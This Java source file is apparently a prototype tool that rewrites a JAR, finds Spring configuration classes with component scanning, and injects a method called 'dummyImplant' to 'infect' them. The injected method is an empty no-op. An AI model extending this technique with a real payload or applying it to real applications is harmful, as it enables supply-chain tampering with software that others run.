package org.example.injector;

import javassist.CtClass;
import javassist.bytecode.*;
import javassist.bytecode.annotation.Annotation;

import java.io.*;
import java.nio.file.Path;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.List;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.jar.JarOutputStream;

public class SpringInjector {
    public static void main(String[] args) {
        if (args.length < 2) {
            System.exit(1);
        }

        SpringInjector injector = new SpringInjector();
        try {
            Path targetPath = Path.of(args[0]);
            Path outputPath = Path.of(args[1]);
            if (targetPath.toRealPath().equals(outputPath.toRealPath())) {
                System.out.println("[-] Target JAR and output JAR cannot be the same.");
                System.exit(1);
            }
            if (injector.infect(targetPath, outputPath)) {
                System.out.println("[+] Infected '" + targetPath + "'. Modified JAR available at: " + outputPath);
            } else {
                System.out.println("[-] Did not infect '" + targetPath + "'.");
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    SpringInjector() {
    }

    public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
        // TODO Consider that some JARs may be multi-versioned
        try (JarFile targetJar = new JarFile(targetJarFilePath.toFile())) {
            return infect(targetJar, outputJar);
        }
    }

    public boolean infect(final JarFile targetJar, Path outputJar) throws IOException {
        // TODO This code is shit. Refactoring needed.
        boolean didInfect = false;
        try (JarOutputStream jarOutputStream = new JarOutputStream(new FileOutputStream(outputJar.toFile()))) {
            boolean foundSignedClasses = false;
            Enumeration<JarEntry> entries = targetJar.entries();
            while (entries.hasMoreElements()) {
                JarEntry entry = entries.nextElement();

                if (!entry.getName().endsWith(".class")) {
                    passEntry(targetJar, jarOutputStream, entry);
                    continue;
                }
                if (entry.getCodeSigners() != null) {
                    //System.out.println("[-] File '" + entry.getName() + "' is signed. Not touching this!");
                    foundSignedClasses = true;
                    passEntry(targetJar, jarOutputStream, entry);
                    continue;
                }

                ClassFile classFile;
                try (DataInputStream in = new DataInputStream(targetJar.getInputStream(entry))) {
                    classFile = new ClassFile(in);
                    if (!isSpringContext(classFile)) {
                        passEntry(targetJar, jarOutputStream, entry);
                        continue;
                    }
                    System.out.println("[+] Found Spring configuration: " + entry.getName());

                    if (!hasComponentScanEnabled(classFile)) {
                        // TODO Explicitly add a @Bean to the configuration
                        // Maybe it doesn't hurt to add it despite @ContentScan being enabled?
                        System.out.println("[-] Spring configuration is not set to scan for components (@ComponentScan). Infection not (yet) supported!");
                        passEntry(targetJar, jarOutputStream, entry);
                        continue;
                    }

                    didInfect = infectClass(classFile);
                    if (didInfect) {
                        newEntry(classFile, jarOutputStream, entry);
                    } else {
                        passEntry(targetJar, jarOutputStream, entry);
                    }
                }
            }
            jarOutputStream.close();

            if (foundSignedClasses) {
                System.out.println("[-] Found signed classes. These will not be considered.");
            }
        }

        return didInfect;
    }

    private boolean infectClass(ClassFile classFile) {
        MethodInfo dummyImplant = classFile.getMethod("dummyImplant");
        if (dummyImplant != null) {
            System.out.println("[-] Class '" + classFile.getName() + "' already infected. Skipping.");
            return false;
        }

        dummyImplant = new MethodInfo(classFile.getConstPool(), "dummyImplant", "()V");
        Bytecode dummyCode = new Bytecode(classFile.getConstPool(), 0, 0);
        dummyCode.addReturn(CtClass.voidType);
        dummyImplant.setCodeAttribute(dummyCode.toCodeAttribute());

        try {
            classFile.addMethod(dummyImplant);
        } catch (DuplicateMemberException e) {
            System.out.println("[!] Unexpected error: " + e.getMessage());
            return false;
        }

        return true;
    }

    private static void passEntry(final JarFile sourceJar, final JarOutputStream out, final JarEntry entry) throws IOException {
        out.putNextEntry(entry);
        BufferedInputStream in = new BufferedInputStream(sourceJar.getInputStream(entry));
        out.write(in.readAllBytes());   // Don't bother with optimization for now
        out.closeEntry();
    }

    private static void newEntry(final ClassFile modified, final JarOutputStream out, final JarEntry newEntry) throws IOException {
        out.putNextEntry(newEntry);
        modified.write(new DataOutputStream(out));
        out.closeEntry();
    }

    private static boolean isSpringContext(final ClassFile classFile) {
        List<Annotation> springAnnotations = classFile.getAttributes().stream()
                .filter(attribute -> attribute instanceof AnnotationsAttribute)
                .map(attribute -> (AnnotationsAttribute) attribute)
                .filter(annotationAttribute -> annotationAttribute.getName().equals("RuntimeVisibleAnnotations"))
                .flatMap(runtimeAnnotationAttribute -> Arrays.stream(runtimeAnnotationAttribute.getAnnotations())
                        .filter(SpringInjector::isAnySpringContextAnnotation)
                )
                .toList();
        return !springAnnotations.isEmpty();
    }

    private static boolean isAnySpringContextAnnotation(final Annotation annotation) {
        return switch (annotation.getTypeName()) {
            case "org.springframework.boot.autoconfigure.SpringBootApplication" -> true;
            case "org.springframework.context.annotation.Configuration" -> true;
            default -> false;
        };
    }

    private static boolean hasComponentScanEnabled(final ClassFile springContextClassFile) {
        List<Annotation> componentScanAnnotations = springContextClassFile.getAttributes().stream()
                .filter(attribute -> attribute instanceof AnnotationsAttribute)
                .map(attribute -> (AnnotationsAttribute) attribute)
                .filter(annotationAttribute -> annotationAttribute.getName().equals("RuntimeVisibleAnnotations"))
                .flatMap(runtimeAnnotationAttribute -> Arrays.stream(runtimeAnnotationAttribute.getAnnotations())
                        .filter(annotation -> annotation.getTypeName().equals("org.springframework.context.annotation.ComponentScan"))
                )
                .toList();
        return !componentScanAnnotations.isEmpty();
    }
}
